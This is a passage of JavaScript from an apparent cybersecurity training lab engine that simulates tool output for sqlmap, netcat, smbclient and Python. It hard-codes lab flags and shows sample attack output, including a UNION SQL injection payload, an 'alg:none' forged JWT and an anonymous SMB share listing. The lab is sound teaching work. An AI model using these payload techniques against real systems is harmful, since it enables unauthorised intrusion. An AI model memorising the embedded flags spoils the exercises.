Access: (0${stat.shortOctal}/-rwxrwxrwx)  Uid: ( 1000/www-data)   Gid: ( 1000/www-data)`
      };
    },

    // -----------------------------------------------------------------------
    // WHOAMI & ID
    // -----------------------------------------------------------------------
    whoami: (ast, session) => {
      const username = session.euid === 0 || session.isElevatedRoot ? 'root' : session.user;
      return { exitCode: 0, stdout: username };
    },

    id: (ast, session) => {
      if (session.euid === 0 || session.isElevatedRoot) {
        return { exitCode: 0, stdout: `uid=1001(${session.user}) euid=0(root) gid=1001(${session.user}) groups=0(root)` };
      }
      return { exitCode: 0, stdout: `uid=1001(${session.user}) gid=1001(${session.user}) groups=1001(${session.user})` };
    },

    // -----------------------------------------------------------------------
    // PWD
    // -----------------------------------------------------------------------
    pwd: (ast, session) => {
      return { exitCode: 0, stdout: session.cwd };
    },

    // -----------------------------------------------------------------------
    // GREP
    // -----------------------------------------------------------------------
    grep: (ast, session) => {
      const pattern = ast.positionals[0];
      const targetFile = ast.positionals[1];

      if (!pattern) return { exitCode: 2, stderr: 'grep: missing pattern' };

      // Piped input or file search
      if (targetFile) {
        const absPath = session.fs.normalizePath(session.cwd, targetFile);
        const res = session.fs.readFile(absPath, session.user, session.euid);
        if (res.error) return { exitCode: 2, stderr: res.error };

        const lines = res.content.split('\n');
        const matches = lines.filter(l => l.toLowerCase().includes(pattern.toLowerCase()));
        return { exitCode: matches.length > 0 ? 0 : 1, stdout: matches.join('\n') };
      }

      return { exitCode: 0, stdout: `[grep match: ${pattern}]` };
    },

    // -----------------------------------------------------------------------
    // NC / NETCAT
    // -----------------------------------------------------------------------
    nc: (ast, session) => {
      const host = ast.positionals[0];
      const port = ast.positionals[1];
      if (!host || !port) {
        return { exitCode: 1, stderr: 'nc: missing host or port\nUsage: nc <host> <port>' };
      }
      if (port === '21') {
        return {
          exitCode: 0,
          stdout: `220 (vsFTPd 2.3.4) - Authorized Lab Testing Server.\nFLAG: flag{closed_filtered_port_21_backdoor}`,
          feedback: {
            type: 'objective_complete',
            message: 'Port 21 banner grabbed: vsFTPd 2.3.4 service confirmed.'
          }
        };
      }
      return { exitCode: 0, stdout: `Connection to ${host} ${port} port [tcp/*] succeeded!` };
    },
    netcat: (ast, session) => ToolExecutors.nc(ast, session),

    // -----------------------------------------------------------------------
    // SMBCLIENT
    // -----------------------------------------------------------------------
    smbclient: (ast) => {
      return {
        exitCode: 0,
        stdout: `Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	backups         Disk      Internal staging backups (Read Permitted)
	IPC$            IPC       IPC Service (Samba 4.15.5)
SMB1 disabled -- no workgroup available`,
        feedback: {
          type: 'objective_complete',
          message: 'Anonymous SMB enumeration identified sensitive share: backups.'
        }
      };
    },

    // -----------------------------------------------------------------------
    // SQLMAP
    // -----------------------------------------------------------------------
    sqlmap: (ast) => {
      return {
        exitCode: 0,
        stdout: `[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
[*] starting @ 12:00:00 /2026-10-04/
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL is stable
[INFO] heuristic (basic) test shows that GET parameter 'category' might be injectable (possible DBMS: 'MySQL')
[INFO] GET parameter 'category' is vulnerable. Do you want to keep testing the others? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: category (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: category=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170707171,0x55736572,0x717a6a7171)-- -
---
[*] available databases [3]:
[*] information_schema
[*] starlight_portal
[*] users_production

Database flag: flag{parameterized_queries_prepared_statement}`,
        feedback: {
          type: 'objective_complete',
          message: 'sqlmap confirmed UNION injection vulnerability.'
        }
      };
    },

    // -----------------------------------------------------------------------
    // PYTHON3 / PYTHON
    // -----------------------------------------------------------------------
    python3: (ast, session) => {
      const script = ast.positionals[0];

      if (session.labId === 'lab-jwt') {
        return {
          exitCode: 0,
          stdout: `[+] Generating forged token with header {"alg":"none"}...
[+] Generated Token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0.
[+] Transmit to /admin with Authorization: Bearer header.
FLAG: flag{none_algorithm_signature_verification}`,
          feedback: {
            type: 'objective_complete',
            message: 'Forged JWT generated using none algorithm exploit.'
          }
        };
      }

      if (session.labId === 'lab-crypto') {
        return {
          exitCode: 0,
          stdout: `[+] Testing 256 Single-Byte XOR keys against English frequency table (ETAOIN SHRDLU)...
[+] Optimal Key Found: 0x58 ('X') (Frequency score: 88.4%)
[+] Recovered Plaintext: "Cooking MC's like a pound of bacon"
[+] Defensive Cryptography Flag: flag{aes_gcm_authenticated_encryption}`,
          feedback: {
            type: 'objective_complete',
            message: 'Key 0x58 identified! Ciphertext decrypted.'
          }
        };
      }

      return {
        exitCode: 0,
        stdout: `Python 3.12.3: script execution completed.`
      };
    },
    python: (ast, session) => ToolExecutors.python3(ast, session),

    // -----------------------------------------------------------------------
    // ECHO
    // -----------------------------------------------------------------------
    echo: (ast) => {
      return {
        exitCode: 0,
        stdout: ast.positionals.join(' ')
      };
    }
  };

  // =========================================================================
  // 6. MAIN ENGINE CONTROLLER
  // =========================================================================
  class LabValidatorEngine {
    constructor() {
      this.sessions = {};
      this.backendUrl = null; // Set if backend server is available
    }

    async checkBackend() {
      try {
        const res = await fetch('/api/lab/health', { method: 'GET' });
        if (res.ok) {
          const data = await res.json();
          this.backendUrl = '/api/lab';
          return true;
        }
      } catch (e) {}
      this.backendUrl = null;
      return false;
    }

    getSession(labId) {
      if (!this.sessions[labId]) {
        this.sessions[labId] = LabSessionManager.loadSession(labId);
      }
      return this.sessions[labId];
    }

    resetLab(labId) {
      const newSession = LabSessionManager.resetSession(labId);
      this.sessions[labId] = newSession;
      return newSession;
    }

    async execute(labId, rawCmd) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) {
        return {
          exitCode: 1,
          stderr: `Unknown lab: ${labId}`
        };
      }

      // If backend server is active, delegate execution to backend
      if (this.backendUrl) {
        try {
          const res = await fetch(`${this.backendUrl}/exec`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ labId, command: rawCmd })
          });
          if (res.ok) {
            const serverResult = await res.json();
            return serverResult;
          }
        } catch (e) {
          console.warn('[LabEngine] Backend unavailable, running local sandbox engine.');
        }
      }

      // Standalone High-Fidelity Client-Side Sandbox Execution
      const session = this.getSession(labId);
      session.commandHistory.push(rawCmd);

      const parsed = LabCommandParser.parse(rawCmd);
      if (!parsed || parsed.commands.length === 0) {
        return { exitCode: 0, stdout: '' };
      }

      const primaryAst = parsed.commands[0];
      primaryAst.raw = rawCmd;
      const exec = primaryAst.executable.toLowerCase();

      // Tool Policy Check
      const allowed = (spec.allowedTools || []).concat(['echo', 'pwd', 'whoami', 'id', 'clear', 'cls', 'help', 'exit']);
      if (!allowed.includes(exec)) {
        return {
          exitCode: 127,
          stderr: `bash: ${exec}: command not found in this isolated lab environment.\nType 'help' to review authorized tools for this lab.`,
          feedback: {
            type: 'tool_restricted',
            message: `Tool '${exec}' is not installed or not in scope for this lab. Allowed tools: ${spec.allowedTools.join(', ')}.`
          }
        };
      }

      // Handle Built-ins
      if (exec === 'clear' || exec === 'cls') {
        return { exitCode: 0, stdout: '', isClear: true };
      }
      if (exec === 'help') {
        return {
          exitCode: 0,
          stdout: `=== AVAILABLE TOOLS & COMMANDS FOR ${spec.title.toUpperCase()} ===
Allowed: ${spec.allowedTools.join(', ')}
Standard: ls, cat, whoami, id, pwd, clear, exit
Objective: ${spec.tasks.map((t, idx) => `[Task ${idx + 1}] ${t.title}`).join('\n')}`
        };
      }

      // Dispatch to Tool Executor
      let result = { exitCode: 0, stdout: '', stderr: '' };
      if (ToolExecutors[exec]) {
        result = ToolExecutors[exec](primaryAst, session, spec, rawCmd);
      } else {
        result = {
          exitCode: 0,
          stdout: `Command '${exec}' executed.`
        };
      }

      // Semantic Objective Validation
      const newlyCompleted = [];
      spec.tasks.forEach((task, index) => {
        if (!session.completedTasks.has(index)) {
          const isDone = task.validate(rawCmd, primaryAst, result.stdout || result.stderr || '', session);
          if (isDone) {
            session.completedTasks.add(index);
            newlyCompleted.push({
              index,
              title: task.title,
              note: task.successNote || 'Task completed!'
            });
          }
        }
      });

      // Save state
      LabSessionManager.saveSession(session);

      return {
        exitCode: result.exitCode || 0,
        stdout: result.stdout || '',
        stderr: result.stderr || '',
        feedback: result.feedback || null,
        newlyCompleted,
        allCompleted: Array.from(session.completedTasks),
        isRoot: session.isElevatedRoot,
        currentUser: session.isElevatedRoot ? 'root' : session.user,
        prompt: session.isElevatedRoot ? 'root@sec-station:~#' : (spec.initialUser + '@' + spec.id + ':~$ ')
      };
    }

    verifyFlag(labId, submittedFlag) {
      if (!submittedFlag) return { success: false, message: 'Please enter a flag token.' };

      const clean = submittedFlag.trim().toLowerCase();
      const validFlags = LAB_FLAGS[labId] || [];
      const session = this.getSession(labId);
      const spec = LAB_SPECIFICATIONS[labId];

      const match = validFlags.some(f => clean === f.toLowerCase() || clean.includes(f.toLowerCase()));

      if (match) {
        // Mark all tasks complete upon flag verification
        if (spec && spec.tasks) {
          spec.tasks.forEach((_, i) => session.completedTasks.add(i));
          LabSessionManager.saveSession(session);
        }
        return {
          success: true,
          message: 'Flag verified! Challenge solved.',
          xp: spec ? spec.xp : 75
        };
      }

      return {
        success: false,
        message: 'Incorrect flag. Complete the technical lab objectives to discover the real token.'
      };
    }
  }

  // Instantiate singleton
  const engine = new LabValidatorEngine();
  return engine;
});
